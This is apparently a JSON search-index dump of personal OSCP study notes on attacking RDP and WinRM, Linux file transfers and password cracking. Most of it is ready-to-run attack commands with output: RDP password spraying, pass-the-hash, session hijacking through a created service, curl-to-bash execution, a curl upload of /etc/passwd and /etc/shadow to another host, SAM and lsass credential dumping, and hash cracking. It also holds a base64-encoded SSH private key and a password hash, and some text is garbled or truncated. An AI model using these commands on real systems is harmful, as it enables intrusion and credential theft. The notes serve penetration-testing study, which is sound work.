10.10.14.20:55772 SA ttl=127 id=38162 iplen=44 seq=3526777417 win=64000 \u003cmss 1357\u003e NSOCK INFO [0.4500s] nsock_iod_new2(): nsock_iod_new (IOD #1) NSOCK INFO [0.4500s] nsock_connect_tcp(): TCP connection requested to 10.129.201.248:3389 (IOD #1) EID 8 NSOCK INFO [0.4820s] nsock_trace_handler_callback(): Callback: CONNECT SUCCESS for EID 8 [10.129.201.248:3389] Service scan sending probe NULL to 10.129.201.248:3389 (tcp) NSOCK INFO [0.4830s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 6000ms) EID 18 NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: READ TIMEOUT for EID 18 [10.129.201.248:3389] Service scan sending probe TerminalServerCookie to 10.129.201.248:3389 (tcp) NSOCK INFO [6.4880s] nsock_write(): Write request for 42 bytes to IOD #1 EID 27 [10.129.201.248:3389] NSOCK INFO [6.4880s] nsock_read(): Read request from IOD #1 [10.129.201.248:3389] (timeout: 5000ms) EID 34 NSOCK INFO [6.4880s] nsock_trace_handler_callback(): Callback: WRITE SUCCESS for EID 27 [10.129.201.248:3389] NSOCK INFO [6.5240s] nsock_trace_handler_callback(): Callback: READ SUCCESS for EID 34 [10.129.201.248:3389] (19 bytes): .........4......... Service scan match (Probe TerminalServerCookie matched with TerminalServerCookie line 13640): 10.129.201.248:3389 is ms-wbt-server. Version: |Microsoft Terminal Services||| ...SNIP... rdp-sec-check.pl\nnmap -sV -sC 10.129.201.248 -p3389 --script rdp* CONNECT TO RDP\ncube111@local[/local]$ xfreerdp /v:10.10.10.132 /d:local /u:administrator /p:‚ÄòPassword0@‚Äô /dynamic-resolution /drive:linux,/home/plaintext/local/academy/filetransfer\nCrowbar - RDP Password Spraying cube111@local[/local]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123' 2022-04-07 15:35:50 START 2022-04-07 15:35:50 Crowbar v0.4.1 2022-04-07 15:35:50 Trying 192.168.220.142:3389 2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123 2022-04-07 15:35:52 STOP Hydra - RDP Password Spraying Attacking RDP\ncube111@local[/local]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp Hydra v9.1 (c) 2020 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52 [WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover [INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections) [WARNING] the rdp module is experimental. Please test, report - and if possible, fix. [DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task [DATA] attacking rdp://192.168.2.147:3389/ [3389][rdp] host: 192.168.2.143 login: administrator password: password123 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56 crackmapexec - RDP Password Spraying\ncrackmapexec rdp 192.168.220.142 -u usernames.txt -p 'password123' --rate-limit 1 RDP Pass-the-Hash (PtH) Adding the DisableRestrictedAdmin Registry Key C:\\local\u003e reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f cube111@local[/local]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9 numerate if the user in rdp local group (powerview)\nEnumerating the Remote Desktop Users Group Privileged Access\nPS C:\\local\u003e Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\" ComputerName : ACADEMY-EA-MS01 GroupName : Remote Desktop Users MemberName : INLANEFREIGHT\\Domain Users SID : S-1-5-21-3842939050-3880317879-2865463114-513 IsGroup : True IsDomain : UNKNOWN Checking the Domain Users Group‚Äôs Local Admin \u0026 Execution Rights using BloodHound Checking Remote Access Rights using BloodHound We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP.\nWe can also utilize this custom Cypher query in BloodHound to hunt for users with this type of access. This can be done by pasting the query into the Raw Query box at the bottom of the screen and hitting enter.\nCode: cypher\nLatest RDP Vulnerabilities In 2019, a critical vulnerability was published in the RDP (TCP/3389) service that also led to remote code execution (RCE) with the identifier CVE-2019-0708. This vulnerability is known as BlueKeep. It does not require prior access to the system to exploit the service for our purposes. However, the exploitation of this vulnerability led and still leads to many malware or ransomware attacks. Large organizations such as hospitals, whose software is only designed for specific versions and libraries, are particularly vulnerable to such attacks, as infrastructure maintenance is costly. Here, too, we will not go into minute detail about this vulnerability but rather keep the focus on the concept.\nProtocol Specific Attacks Let‚Äôs imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user‚Äôs remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.\nRDP Session Hijacking As shown in the example below, we are logged in as the user juurena (UserID = 2) who has Administrator privileges. Our goal is to hijack the user lewen (User ID = 4), who is also logged in via RDP.\nTo successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID (4 for the lewen session in our example) we would like to connect to which session name (rdp-tcp#13, which is our current session). So, for example, the following command will open a new console as the specified SESSION_ID within our current RDP session:\nAttacking RDP\nC:\\local\u003e tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME} If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use Microsoft sc.exe binary. First, we specify the service name (sessionhijack) and the binpath, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.\nAttacking RDP\nC:\\local\u003e query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME \u003ejuurena rdp-tcp#13 1 Active 7 8/25/2021 1:23 AM lewen rdp-tcp#14 2 Active * 8/25/2021 1:28 AM C:\\local\u003e sc.exe create sessionhijack binpath= \"cmd.exe /k tscon 2 /dest:rdp-tcp#13\" [SC] CreateService SUCCESS To run the command, we can start the sessionhijack service :\nAttacking RDP\nC:\\local\u003e net start sessionhijack Once the service is started, a new terminal with the lewen user session will appear. With this new account, we can attempt to discover what kind of privileges it has on the network, and maybe we‚Äôll get lucky, and the user is a member of the Help Desk group with admin rights to many hosts or even a Domain Admin.\nNote: This method no longer works on Server 2019.",
    "description": "RDP\ncube111@local[/local]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp* Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET Nmap scan report for 10.129.201.248 Host is up (0.036s latency). PORT STATE SERVICE VERSION 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-enum-encryption: | Security layer | CredSSP (NLA): SUCCESS | CredSSP with Early User Auth: SUCCESS |_ RDSTLS: SUCCESS | rdp-ntlm-info: | Target_Name: ILF-SQL-01 | NetBIOS_Domain_Name: ILF-SQL-01 | NetBIOS_Computer_Name: ILF-SQL-01 | DNS_Domain_Name: ILF-SQL-01 | DNS_Computer_Name: ILF-SQL-01 | Product_Version: 10.",
    "tags": [],
    "title": "RDP and winrm",
    "uri": "/oscp-notes/rdp-and-windows-remote-management/index.html"
  },
  {
    "breadcrumb": "DrakonOps",
    "content": "",
    "description": "",
    "tags": [],
    "title": "Categories",
    "uri": "/categories/index.html"
  },
  {
    "breadcrumb": "",
    "content": "",
    "description": "",
    "tags": [],
    "title": "DrakonOps",
    "uri": "/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Transffering file using base64 copy¬†paste\nPwnbox - Check File MD5 hash cube111@local[/local]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278 id_rsa cat id_rsa |base64 -w 0;echo LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo= We copy this content, paste it onto our Linux target machine, and use base64 with the option `-d‚Äô to decode it.\nLinux - Decode the File cube111@local[/local]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUF Linux - Confirm the MD5 Hashes Match cube111@local[/local]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278 id_rsa To download a file using wget, we need to specify the URL and the option `-O‚Äô to set the output filename.\nDownload a File Using wget cube111@local[/local]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh cURL is very similar to wget, but the output filename option is lowercase `-o'.\nDownload a File Using cURL cube111@local[/local]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh Fileless Download with cURL cube111@local[/local]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash Similarly, we can download a Python script file from a web server and pipe it into the Python binary. Let‚Äôs do that, this time using wget.\nFileless Download with wget cube111@local[/local]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3 Hello World! Download with Bash (/dev/tcp) There may also be situations where none of the well-known file transfer tools are available. As long as Bash version 2.04 or greater is installed (compiled with ‚Äìenable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.\nConnect to the Target Webserver cube111@local[/local]$ exec 3\u003c\u003e/dev/tcp/10.10.10.32/80 HTTP GET Request cube111@local[/local]$ echo -e \"GET /LinEnum.sh HTTP/1.1\\n\\n\"\u003e\u00263 Print the Response cube111@local[/local]$ cat \u003c\u00263 Linux - Downloading Files Using SCP cube111@local[/local]$ scp plaintext@192.168.49.128:/root/myroot.txt . Upload Operations Web Upload As mentioned in the Windows File Transfer Methods section, we can use uploadserver, an extended module of the Python HTTP.Server module, which includes a file upload page. For this Linux example, let‚Äôs see how we can configure the uploadserver module to use HTTPS for secure communication.\nThe first thing we need to do is to install the uploadserver module.\nPwnbox - Start Web Server cube111@local[/local]$ sudo python3 -m pip install --user uploadserver Collecting uploadserver Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB) Installing collected packages: uploadserver Successfully installed uploadserver-2.0.1 Pwnbox - Create a Self-Signed Certificate cube111@local[/local]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' cube111@local[/local]$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem File upload available at /upload Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ... cube111@local[/local]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure Linux - Creating a Web Server with Python3 cube111@local[/local]$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Linux - Creating a Web Server with Python2.7 cube111@local[/local]$ python2.7 -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Linux - Creating a Web Server with PHP cube111@local[/local]$ php -S 0.0.0.0:8000 [Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started Linux - Creating a Web Server with Ruby cube111@local[/local]$ ruby -run -ehttpd . -p8000 [2022-05-23 09:35:46] INFO WEBrick 1.6.1 [2022-05-23 09:35:46] INFO ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu] [2022-05-23 09:35:46] INFO WEBrick::HTTPServer#start: pid=1705 port=8000 Encrypting /etc/passwd with openssl Protected File Transfers\ncube111@local[/local]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc enter aes-256-cbc encryption password: Verifying - enter aes-256-cbc encryption password: Decrypt passwd.enc with openssl Protected File Transfers\ncube111@local[/local]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd MAKE A TLS SERVER\nimport http.server\nimport ssl\n# Define the server address and port\nserver_address = (‚Äò0.0.0.0‚Äô, 40000) # Listen on all interfaces, port 4443\n# Create an HTTP server\nhttpd = http.server.HTTPServer(server_address, http.server.SimpleHTTPRequestHandler)\n# Wrap the server socket with SSL\nhttpd.socket = ssl.wrap_socket(\nhttpd.socket,\nkeyfile=‚Äúkey.pem‚Äù, # Path to the private key\ncertfile=‚Äúcert.pem‚Äù, # Path to the certificate\nserver_side=True,\nssl_version=ssl.PROTOCOL_TLSv1_2\n)\nprint(f\"Starting HTTPS server on https://{server_address[0]}:{server_address[1]}\")\nhttpd.serve_forever()",
    "description": "Transffering file using base64 copy¬†paste\nPwnbox - Check File MD5 hash cube111@local[/local]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278 id_rsa cat id_rsa |base64 -w 0;echo LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo= We copy this content, paste it onto our Linux target machine, and use base64 with the option `-d‚Äô to decode it.\nLinux - Decode the File cube111@local[/local]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUF Linux - Confirm the MD5 Hashes Match cube111@local[/local]$ md5sum id_rsa 4e301756a07ded0a2dd6953abf015278 id_rsa To download a file using wget, we need to specify the URL and the option `-O‚Äô to set the output filename.",
    "tags": [],
    "title": "File transfers Linux",
    "uri": "/oscp-notes/file-transfers-linux/index.html"
  },
  {
    "breadcrumb": "DrakonOps¬†\u003e¬†OSCP Notes",
    "content": "Username: kali\nHash Algorithm: Yescrypt ($y$)\nSalt: lxhAOT0lf3zR/cuNiG8OX.\nHash: XEOi/b8Qy6I3nbYZl9RJnMQw3HiykbffrD6X1okqi.0\nLast Change: 20176 (around 2025)\nMin Days: 0 (can change password any time)\nMax Days: 99999 (password never expires)\nWarning: 7 days before expiry\nirfan:$y$j9T$u7t3UrHAk.3WIkkecUE1y0$Q/aAFtrBrik/LKHFUp7vahK72JQtJDpLKRgKWAMAXaD:20120:0:99999:7:::\njohn\n‚Äújohn.pot‚Äù (~/.john/john.pot)\njohn ‚Äìlist=formats\nOr:\nbash\nCopy\nEdit\njohn ‚Äìshow hashes.txt\n(It will try to parse and show hash types.)\nCracking with John Hash Format Example Command Description afs john --format=afs hashes_to_crack.txt AFS (Andrew File System) password hashes bfegg john --format=bfegg hashes_to_crack.txt bfegg hashes used in Eggdrop IRC bots bf john --format=bf hashes_to_crack.txt Blowfish-based crypt(3) hashes bsdi john --format=bsdi hashes_to_crack.txt BSDi crypt(3) hashes crypt(3) john --format=crypt hashes_to_crack.txt Traditional Unix crypt(3) hashes des john --format=des hashes_to_crack.txt Traditional DES-based crypt(3) hashes dmd5 john --format=dmd5 hashes_to_crack.txt DMD5 (Dragonfly BSD MD5) password hashes dominosec john --format=dominosec hashes_to_crack.txt IBM Lotus Domino 6/7 password hashes EPiServer SID hashes john --format=episerver hashes_to_crack.txt EPiServer SID (Security Identifier) password hashes hdaa john --format=hdaa hashes_to_crack.txt hdaa password hashes used in Openwall GNU/Linux hmac-md5 john --format=hmac-md5 hashes_to_crack.txt hmac-md5 password hashes hmailserver john --format=hmailserver hashes_to_crack.txt hmailserver password hashes ipb2 john --format=ipb2 hashes_to_crack.txt Invision Power Board 2 password hashes krb4 john --format=krb4 hashes_to_crack.txt Kerberos 4 password hashes krb5 john --format=krb5 hashes_to_crack.txt Kerberos 5 password hashes LM john --format=LM hashes_to_crack.txt LM (Lan Manager) password hashes lotus5 john --format=lotus5 hashes_to_crack.txt Lotus Notes/Domino 5 password hashes mscash john --format=mscash hashes_to_crack.txt MS Cache password hashes mscash2 john --format=mscash2 hashes_to_crack.txt MS Cache v2 password hashes mschapv2 john --format=mschapv2 hashes_to_crack.txt MSCHAP v2 password hashes mskrb5 john --format=mskrb5 hashes_to_crack.txt MS Kerberos 5 password hashes mssql05 john --format=mssql05 hashes_to_crack.txt MS SQL 2005 password hashes mssql john --format=mssql hashes_to_crack.txt MS SQL password hashes mysql-fast john --format=mysql-fast hashes_to_crack.txt MySQL fast password hashes mysql john --format=mysql hashes_to_crack.txt MySQL password hashes mysql-sha1 john --format=mysql-sha1 hashes_to_crack.txt MySQL SHA1 password hashes NETLM john --format=netlm hashes_to_crack.txt NETLM (NT LAN Manager) password hashes NETLMv2 john --format=netlmv2 hashes_to_crack.txt NETLMv2 (NT LAN Manager version 2) password hashes NETNTLM john --format=netntlm hashes_to_crack.txt NETNTLM (NT LAN Manager) password hashes NETNTLMv2 john --format=netntlmv2 hashes_to_crack.txt NETNTLMv2 (NT LAN Manager version 2) password hashes NEThalfLM john --format=nethalflm hashes_to_crack.txt NEThalfLM (NT LAN Manager) password hashes md5ns john --format=md5ns hashes_to_crack.txt md5ns (MD5 namespace) password hashes nsldap john --format=nsldap hashes_to_crack.txt nsldap (OpenLDAP SHA) password hashes ssha john --format=ssha hashes_to_crack.txt ssha (Salted SHA) password hashes NT john --format=nt hashes_to_crack.txt NT (Windows NT) password hashes openssha john --format=openssha hashes_to_crack.txt OPENSSH private key password hashes oracle11 john --format=oracle11 hashes_to_crack.txt Oracle 11 password hashes oracle john --format=oracle hashes_to_crack.txt Oracle password hashes pdf john --format=pdf hashes_to_crack.txt PDF (Portable Document Format) password hashes phpass-md5 john --format=phpass-md5 hashes_to_crack.txt PHPass-MD5 (Portable PHP password hashing framework) password hashes phps john --format=phps hashes_to_crack.txt PHPS password hashes pix-md5 john --format=pix-md5 hashes_to_crack.txt Cisco PIX MD5 password hashes po john --format=po hashes_to_crack.txt Po (Sybase SQL Anywhere) password hashes rar john --format=rar hashes_to_crack.txt RAR (WinRAR) password hashes raw-md4 john --format=raw-md4 hashes_to_crack.txt Raw MD4 password hashes raw-md5 john --format=raw-md5 hashes_to_crack.txt Raw MD5 password hashes raw-md5-unicode john --format=raw-md5-unicode hashes_to_crack.txt Raw MD5 Unicode password hashes raw-sha1 john --format=raw-sha1 hashes_to_crack.txt Raw SHA1 password hashes raw-sha224 john --format=raw-sha224 hashes_to_crack.txt Raw SHA224 password hashes raw-sha256 john --format=raw-sha256 hashes_to_crack.txt Raw SHA256 password hashes raw-sha384 john --format=raw-sha384 hashes_to_crack.txt Raw SHA384 password hashes raw-sha512 john --format=raw-sha512 hashes_to_crack.txt Raw SHA512 password hashes salted-sha john --format=salted-sha hashes_to_crack.txt Salted SHA password hashes sapb john --format=sapb hashes_to_crack.txt SAP CODVN B (BCODE) password hashes sapg john --format=sapg hashes_to_crack.txt SAP CODVN G (PASSCODE) password hashes sha1-gen john --format=sha1-gen hashes_to_crack.txt Generic SHA1 password hashes skey john --format=skey hashes_to_crack.txt S/Key (One-time password) hashes ssh john --format=ssh hashes_to_crack.txt SSH (Secure Shell) password hashes sybasease john --format=sybasease hashes_to_crack.txt Sybase ASE password hashes xsha john --format=xsha hashes_to_crack.txt xsha (Extended SHA) password hashes zip john --format=zip hashes_to_crack.txt ZIP (WinZip) password hashes Wordlist Mode cube111@local[/local]$ john --wordlist=\u003cwordlist_file\u003e --rules \u003chash_file\u003e File extension crack\nDescription pdf2john Converts PDF documents for John ssh2john Converts SSH private keys for John mscash2john Converts MS Cash hashes for John keychain2john Converts OS X keychain files for John rar2john Converts RAR archives for John pfx2john Converts PKCS#12 files for John truecrypt_volume2john Converts TrueCrypt volumes for John keepass2john Converts KeePass databases for John vncpcap2john Converts VNC PCAP files for John putty2john Converts PuTTY private keys for John zip2john Converts ZIP archives for John hccap2john Converts WPA/WPA2 handshake captures for John office2john Converts MS Office documents for John wpa2john Converts WPA/WPA2 handshakes for John 07/07/2025 11:23\ncube111@local[/local]$ locate *2john* winrm\ncube111@local[/local]$ crackmapexec \u003cproto\u003e \u003ctarget-IP\u003e -u \u003cuser or userlist\u003e -p \u003cpassword or passwordlist\u003e Evil-WinRM Usage Network Services\ncube111@local[/local]$ evil-winrm -i \u003ctarget-IP\u003e -u \u003cusername\u003e -p \u003cpassword\u003e Hydra - SSH We can use a tool such as Hydra to brute force SSH. This is covered in-depth in the Login Brute Forcing module.\nNetwork Services\ncube111@local[/local]$ hydra -L user.list -P password.list ssh://10.129.42.197 Hydra - RDP We can also use Hydra to perform RDP bruteforcing.\nNetwork Services\ncube111@local[/local]$ hydra -L user.list -P password.list rdp://10.129.42.197 SMB\ncube111@local[/local]$ hydra -L user.list -P password.list smb://10.129.42.197 Hashcat\nIdentifying Hashes\n$1$ : MD5 $2a$ : Blowfish $2y$ : Blowfish, with correct handling of 8 bit characters $5$ : SHA256 $6$ : SHA512 -a 0 simple wordlist\n‚îå‚îÄ[irfan‚ò∫cube]‚îÄ[~]\n‚îî‚îÄ‚îÄ‚ïº $hashcat -a 0 -m 3200 b /usr/share/wordlists/rockyou.txt\n-a 1 combination attack mode\ncube111@local[/local]$ awk '(NR==FNR) { a[NR]=$0 } (NR != FNR) { for (i in a) { print $0 a[i] } }' file2 file1 superhello superpassword worldhello wordpassword secrethello secretpassword Hashcat - Syntax The syntax for the combination attack is:\nCombination Attack\ncube111@local[/local]$ hashcat -a 1 -m \u003chash type\u003e \u003chash file\u003e \u003cwordlist1\u003e \u003cwordlist2\u003e -a 3 mask attack\ncube111@local[/local]$ hashcat -a 3 -m 0 md5_mask_example_hash -1 01 'ILFREIGHT?l?l?l?l?l20?1?d' Placeholder Meaning ?l lower-case ASCII letters (a-z) ?u upper-case ASCII letters (A-Z) ?d digits (0-9) ?h 0123456789abcdef ?H 0123456789ABCDEF ?s special characters (\"space\"!\"#$%\u0026‚Äô()*+,-./:;\u003c=\u003e?@[]^_`{ ?a ?l?u?d?s ?b 0x00 - 0xff -a6 and -a7¬†hybrid attack\ncube111@local[/local]$ hashcat -a 6 -m 0 hybrid_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt '?d?s' cube111@local[/local]$ hashcat -a 7 -m 0 hybrid_hash_prefix -1 01 '20?1?d' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt hashcat rules\nFunction Description : Do nothing. l Lowercase all letters. u Uppercase all letters. c Capitalize the first letter and lowercase others. sXY Replace all instances of X with Y. $! Add the exclamation character at the end. cube111@local[/local]$ hashcat --force password.list -r custom.rule --stdout | sort -u \u003e mut_password.list cube111@local[/local]$ cat custom.rule : c so0 c so0 sa@ c sa@ c sa@ so0 $! $! c $! so0 $! sa@ $! c so0 $! c sa@ $! so0 sa@ $! c so0 sa@ Generating Wordlists Using CeWL cube111@local[/local]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist cube111@local[/local]$ wc -l inlane.wordlist 326 DEFAULT CREDS https://github.com/ihebski/DefaultCreds-cheat-sheet\nCredential Stuffing\n(username:password). In addition, we can select the passwords and mutate them by our rules to increase the probability of hits.\ncube111@local[/local]$ hydra -C \u003cuser_pass.list\u003e \u003cprotocol\u003e://\u003cIP\u003e https://raw.githubusercontent.com/ihebski/DefaultCreds-cheat-sheet/main/DefaultCreds-Cheat-Sheet.csv\nATTACKING SAM\nC:\\WINDOWS\\system32\u003e reg.exe save hklm\\sam C:\\sam.save The operation completed successfully. C:\\WINDOWS\\system32\u003e reg.exe save hklm\\system C:\\system.save The operation completed successfully. C:\\WINDOWS\\system32\u003e reg.exe save hklm\\security C:\\security.save The operation completed successfully. python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL cube111@local[/local]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt DUMPING SAM and creds from lsass when u dont have system access directly\ncube111@local[/local]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p local_@cademy_stdnt! --lsa cube111@local[/local]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p local_@cademy_stdnt! --sam Attacking lsass(credential guard should be disabled)\nGet-CimInstance -ClassName Win32_DeviceGuard -Namespace Root\\Microsoft\\Windows\\DeviceGuard\ncan right click in task manager and create dump\nPS C:\\Windows\\system32\u003e rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full here 672 is the PID\nnow read the dump with this\ncube111@local[/local]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp Attacking ntds.Dit\nUsername Convention Practical Example for Jane Jill Doe firstinitiallastname jdoe firstinitialmiddleinitiallastname jjdoe firstnamelastname janedoe firstname.lastname jane.doe lastname.firstname doe.jane nickname doedoehacksstuff cube111@local[/local]$ 